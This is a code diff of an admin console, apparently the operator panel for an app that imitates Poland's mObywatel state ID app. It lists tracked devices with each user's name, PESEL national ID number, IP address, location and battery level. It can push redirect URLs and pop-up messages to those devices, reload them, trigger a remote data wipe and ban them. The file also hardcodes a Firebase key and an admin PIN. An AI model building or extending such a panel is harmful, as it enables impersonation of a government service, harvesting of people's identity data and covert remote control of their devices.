@@ -3,135 +3,126 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin - Console mObywatel</title>
+<title>Admin Console - mObywatel</title>
 
-<!-- Firebase Compat Libraries -->
+<!-- Firebase Compat -->
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 
 <style>
-@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Roboto:wght@400;700&display=swap');
+
+:root {
+    --bg: #0a0a0f;
+    --card-bg: #12121a;
+    --green: #00ff41;
+    --border: #1a1a24;
+}
 
 body {
     margin: 0;
     font-family: 'JetBrains Mono', monospace;
-    background: #050505;
-    color: #00ff41; /* Classic Matrix/Hacker Green */
-    padding: 15px;
+    background: var(--bg);
+    color: #fff;
+    padding: 20px;
 }
 
-.header-container {
+.header {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    border-bottom: 2px solid #00ff41;
+    border-bottom: 1px solid var(--green);
     padding-bottom: 10px;
     margin-bottom: 20px;
 }
 
-h1 { font-size: 18px; text-transform: uppercase; letter-spacing: 2px; }
+h1 { font-size: 18px; color: var(--green); margin: 0; }
+
+.stats-bar { font-size: 12px; color: #666; margin-bottom: 20px; }
 
 .device-card {
-    background: #0f0f0f;
-    border: 1px solid #1a1a1a;
-    border-left: 4px solid #00ff41;
-    border-radius: 4px;
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
     padding: 15px;
     margin-bottom: 15px;
-    transition: 0.2s;
+    position: relative;
+    overflow: hidden;
 }
 
-.device-card:hover { border-color: #00ff41; box-shadow: 0 0 15px rgba(0,255,65,0.1); }
+.device-card.online { border-left: 4px solid var(--green); }
+.device-card.offline { border-left: 4px solid #444; }
 
-.card-top { display: flex; justify-content: space-between; margin-bottom: 10px; }
+.card-header {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 10px;
+}
 
-.identity-name { font-size: 16px; font-weight: 700; color: #fff; }
-.identity-sub { font-size: 11px; color: #666; margin-top: 2px; }
+.name { font-size: 16px; font-weight: 700; color: var(--green); }
+.status-pill { font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
+.status-online { background: rgba(0, 255, 65, 0.1); color: var(--green); }
+.status-offline { background: rgba(255, 255, 255, 0.05); color: #888; }
 
 .info-grid {
     display: grid;
     grid-template-columns: 1fr 1fr;
-    gap: 10px;
+    gap: 8px;
     font-size: 11px;
-    margin-top: 10px;
-    padding-top: 10px;
-    border-top: 1px solid #1a1a1a;
 }
 
-.info-item b { color: #00ff41; opacity: 0.7; }
+.info-item b { color: #888; display: block; font-size: 9px; text-transform: uppercase; }
 
-.status-badge {
-    padding: 2px 8px;
-    border-radius: 3px;
-    font-size: 10px;
-    font-weight: 700;
-}
-
-.status-active { background: rgba(0,255,65,0.1); color: #00ff41; }
-.status-banned { background: rgba(255,0,0,0.1); color: #ff0000; }
-.status-timeout { background: rgba(255,165,0,0.1); color: #ffa500; }
-
-.command-center {
+.controls {
     margin-top: 15px;
-    padding: 10px;
-    background: #151515;
-    border-radius: 4px;
-}
-
-.cmd-row {
     display: flex;
-    gap: 5px;
-    margin-bottom: 5px;
+    flex-wrap: wrap;
+    gap: 10px;
+    padding-top: 10px;
+    border-top: 1px solid var(--border);
 }
 
-input, select {
+.cmd-input {
     background: #000;
     border: 1px solid #333;
-    color: #00ff41;
-    padding: 5px;
+    color: var(--green);
+    padding: 4px 8px;
     font-family: inherit;
     font-size: 11px;
-    outline: none;
     flex: 1;
 }
 
 button {
-    background: #1a1a1a;
+    background: #1a1a24;
     border: 1px solid #333;
     color: #fff;
     padding: 5px 10px;
+    font-family: inherit;
+    font-size: 11px;
     cursor: pointer;
-    font-size: 10px;
-    font-weight: bold;
-    transition: 0.2s;
 }
 
-button:hover { background: #00ff41; color: #000; }
-.btn-red:hover { background: #ff0000; color: #fff; }
-.btn-purple:hover { background: #a020f0; color: #fff; }
+button:hover { background: var(--green); color: #000; }
+.btn-danger:hover { background: #ff4444; color: #fff; }
 
-.back-btn { color: #00ff41; text-decoration: none; font-size: 11px; }
-
-.online-status { font-size: 10px; display: flex; align-items: center; gap: 5px; }
-.dot { width: 6px; height: 6px; border-radius: 50%; }
-.dot-on { background: #00ff41; box-shadow: 0 0 5px #00ff41; }
-.dot-off { background: #666; }
+.empty-msg { text-align: center; color: #444; margin-top: 50px; }
 </style>
-
 </head>
 <body>
 
-<div class="header-container">
-    <a href="more.html" class="back-btn">[BACK]</a>
-    <h1>ROOT@MOBYWATEL:~/CONSOLE</h1>
-    <div id="stats" style="font-size:10px;">DEVICES: 0</div>
+<div class="header">
+    <h1>MOBYWATEL ADMIN CONSOLE v2.0</h1>
+    <a href="more.html" style="color:#666; text-decoration:none; font-size:12px;">[ WYJDŹ ]</a>
 </div>
 
-<div id="devices-list">
-    <p style="text-align:center;">SCANNING NETWORK...</p>
+<div class="stats-bar" id="stats">Ładowanie systemów...</div>
+
+<div id="devices-container">
+    <p class="empty-msg">Skanowanie sieci...</p>
 </div>
 
 <script>
+// --- KONFIGURACJA ---
 const firebaseConfig = {
   apiKey: "AIzaSyBaPHJSgHSBlT503b6EJxvgdeFJ2sxUuoY",
   authDomain: "obywatel-polski.firebaseapp.com",
@@ -141,105 +132,99 @@ const firebaseConfig = {
   appId: "1:146396600602:web:cd845989d2a6bfade034a3"
 };
 
-if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+// Inicjalizacja
+if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+}
 const db = firebase.firestore();
 
+// Sprawdź Auth
 if (sessionStorage.getItem('adminAuth') !== 'true') {
-    let pin = prompt("ACCESS DENIED. ENTER ADMIN PIN:");
-    if (pin && btoa(pin) === "ODQ2Mg==") {
+    let pin = prompt("AUTORYZACJA WYMAGANA. WPISZ PIN:");
+    if (pin && btoa(pin) === "ODQ2Mg==") { // PIN: 8462
         sessionStorage.setItem('adminAuth', 'true');
     } else {
         window.location.href = "index.html";
     }
 }
 
-function renderDevices(docs) {
-    const listEl = document.getElementById('devices-list');
-    document.getElementById('stats').innerText = "DEVICES: " + docs.length;
+// Renderowanie
+function render(docs) {
+    const container = document.getElementById('devices-container');
+    document.getElementById('stats').innerText = `ZAREJESTROWANE URZĄDZENIA: ${docs.length}`;
     
-    let allDevices = docs.map(d => ({id: d.id, ...d.data()}));
-    allDevices.sort((a, b) => b.lastSeen - a.lastSeen);
-
-    if (allDevices.length === 0) {
-        listEl.innerHTML = '<p style="text-align:center;">NO NODES FOUND.</p>';
+    if (docs.length === 0) {
+        container.innerHTML = '<p class="empty-msg">BRAK URZĄDZEŃ W BAZIE.</p>';
         return;
     }
 
-    listEl.innerHTML = '';
-
-    allDevices.forEach((dev) => {
-        const isOnline = (Date.now() - dev.lastSeen) < 45000;
-        const onlineHtml = `<div class="online-status"><div class="dot ${isOnline ? 'dot-on' : 'dot-off'}"></div> ${isOnline ? 'ONLINE' : 'OFFLINE'}</div>`;
+    container.innerHTML = '';
+    
+    docs.forEach(doc => {
+        const d = doc.data();
+        const id = doc.id;
+        const isOnline = (Date.now() - d.lastSeen) < 60000;
         
-        let statusClass = 'status-active';
-        let statusText = 'ACTIVE';
-        if (dev.status === 'banned') { statusClass = 'status-banned'; statusText = 'BANNED'; }
-        else if (dev.status === 'timeout' && Date.now() < dev.timeoutUntil) { 
-            statusClass = 'status-timeout'; statusText = 'TIMEOUT'; 
-        }
-
-        let card = document.createElement('div');
-        card.className = 'device-card';
+        const card = document.createElement('div');
+        card.className = `device-card ${isOnline ? 'online' : 'offline'}`;
         card.innerHTML = `
-            <div class="card-top">
-                <div>
-                    <div class="identity-name">${dev.identity || 'UNKNOWN NODE'}</div>
-                    <div class="identity-sub">PESEL: ${dev.pesel || '---'} | ID: ${dev.id.substring(0,12)}</div>
-                </div>
-                <div style="text-align:right">
-                    <div class="status-badge ${statusClass}">${statusText}</div>
-                    ${onlineHtml}
-                </div>
+            <div class="card-header">
+                <div class="name">${d.identity || 'ANONIM'}</div>
+                <div class="status-pill ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</div>
             </div>
             
             <div class="info-grid">
-                <div><b>[LOC]</b> ${dev.location || '---'}</div>
-                <div><b>[IP]</b> ${dev.ip || '---'}</div>
-                <div><b>[ISP]</b> ${dev.isp || '---'}</div>
-                <div><b>[PLAT]</b> ${dev.platform || '---'}</div>
-                <div><b>[NET]</b> ${dev.connection || '---'}</div>
-                <div><b>[BAT]</b> ${dev.battery || '---'}</div>
-                <div><b>[PAGE]</b> ${dev.currentPage || '---'}</div>
-                <div><b>[SCR]</b> ${dev.screen || '---'} [${dev.orientation || '---'}]</div>
+                <div class="info-item"><b>Lokalizacja</b>${d.location || '---'}</div>
+                <div class="info-item"><b>IP Address</b>${d.ip || '---'}</div>
+                <div class="info-item"><b>Aktualna strona</b>${d.currentPage || '---'}</div>
+                <div class="info-item"><b>Urządzenie</b>${d.name || '---'}</div>
+                <div class="info-item"><b>Bateria</b>${d.battery || '---'}</div>
+                <div class="info-item"><b>PESEL</b>${d.pesel || '---'}</div>
             </div>
 
-            <div class="command-center">
-                <div class="cmd-row">
-                    <input type="text" id="val_${dev.id}" placeholder="URL / Message...">
-                    <button onclick="sendCmd('${dev.id}', 'redirect')">REDIRECT</button>
-                    <button onclick="sendCmd('${dev.id}', 'alert')">ALERT</button>
-                </div>
-                <div class="cmd-row">
-                    <button onclick="sendCmd('${dev.id}', 'reload')">RELOAD</button>
-                    <button onclick="sendCmd('${dev.id}', 'vibrate')">VIBRATE</button>
-                    <button class="btn-purple" onclick="setSimpleAction('${dev.id}', 'wipe')">WIPE DATA</button>
-                    <button class="btn-red" onclick="setSimpleAction('${dev.id}', 'ban')">BAN</button>
-                    <button style="color:#00ff41" onclick="setSimpleAction('${dev.id}', 'unban')">UNBAN</button>
-                </div>
+            <div class="controls">
+                <input type="text" id="in_${id}" class="cmd-input" placeholder="Wpisz URL lub wiadomość...">
+                <button onclick="send('${id}', 'redirect')">PRZEKIERUJ</button>
+                <button onclick="send('${id}', 'alert')">POPU-UP</button>
+                <button onclick="send('${id}', 'reload')">RELOAD</button>
+                <button class="btn-danger" onclick="wipe('${id}')">WIPE</button>
+                <button onclick="ban('${id}')">${d.status === 'banned' ? 'UNBAN' : 'BAN'}</button>
             </div>
         `;
-        listEl.appendChild(card);
+        container.appendChild(card);
     });
 }
 
-function sendCmd(id, type) {
-    const val = document.getElementById('val_' + id).value;
-    if ((type === 'redirect' || type === 'alert') && !val) return alert("Enter value first!");
-    
+// Akcje
+window.send = (id, type) => {
+    const val = document.getElementById(`in_${id}`).value;
     db.collection('devices').doc(id).update({
         cmd: { type: type, val: val },
         cmdId: Date.now().toString()
     });
-}
+};
 
-function setSimpleAction(id, type) {
-    const docRef = db.collection('devices').doc(id);
-    if (type === 'ban') docRef.update({ status: 'banned' });
-    if (type === 'unban') docRef.update({ status: 'active', timeoutUntil: 0 });
-    if (type === 'wipe') docRef.update({ remoteWipe: true });
-}
+window.wipe = (id) => {
+    if(confirm("WYCZYŚCIĆ DANE UŻYTKOWNIKA?")) {
+        db.collection('devices').doc(id).update({ remoteWipe: true });
+    }
+};
 
-db.collection('devices').onSnapshot(snap => renderDevices(snap.docs));
+window.ban = (id) => {
+    db.collection('devices').doc(id).get().then(s => {
+        const newStatus = s.data().status === 'banned' ? 'active' : 'banned';
+        db.collection('devices').doc(id).update({ status: newStatus });
+    });
+};
+
+// Nasłuch
+db.collection('devices').orderBy('lastSeen', 'desc').onSnapshot(snap => {
+    render(snap.docs);
+}, err => {
+    console.error("Firestore Error:", err);
+    document.getElementById('devices-container').innerHTML = `<p style="color:red">BŁĄD BAZY DANYCH: ${err.message}</p>`;
+});
 </script>
+
 </body>
 </html>
